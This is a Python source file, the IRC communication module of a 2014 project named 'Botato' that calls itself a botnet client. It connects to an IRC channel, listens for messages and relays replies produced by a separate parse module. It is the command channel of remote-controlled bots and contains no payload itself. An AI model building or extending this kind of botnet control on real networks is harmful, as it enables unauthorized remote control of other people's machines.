''' Botato - A botnet client for native execution across supported networks for remote functionality.
	Copyright (C) 2014 EnKrypt
	Copyright (C) 2014 Jir0
	Copyright (C) 2014 Laneone

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU Affero General Public License as published by
	the Free Software Foundation,either version 3 of the License,or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Affero General Public License for more details.

	You should have received a copy of the GNU Affero General Public License
	along with this program.  If not,see <http://www.gnu.org/licenses/>.
'''

import sys
import socket

import parse

class IRC(object):
	'Wrapper for integrated communication over the IRC protocol'
	PONG="PONG"
	
	prefix="P"
	
	def __init__(self,host,port=6667,channel="botato"):
		self.host=host
		self.port=port
		self.channel="#"+channel
		self.sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.nowlistening=False
		
	def send(self,data):
		self.sock.send(data.encode())
		
	def read(self):
		return self.sock.recv(2040).decode()
		
	def connect(self):
		print("Connecting to "+self.host+" on channel "+self.channel+" via port "+str(self.port))
		self.sock.connect((self.host, self.port))
		self.send("USER "+IRC.prefix+" \"\" \"\" :Botato\r\n")
		self.send("NICK "+IRC.prefix+"\r\n")
		self.send("JOIN "+self.channel+"\r\n")
	
	def startListening(self):
		self.nowlistening=True
		while 1:
			text=self.read()
			print(text)
			if parse.Parse.parsetext(text,self)!=None:
				self.send(parse.Parse.parsetext(text,self)+"\r\n")
				print("Sent: "+parse.Parse.parsetext(text,self))
				
	def provideConsole(self,inp):
		for line in inp:
			if line.startswith("/"):
				self.send(line[1])
			else:
				self.send("PRIVMSG "+self.channel+" :"+line)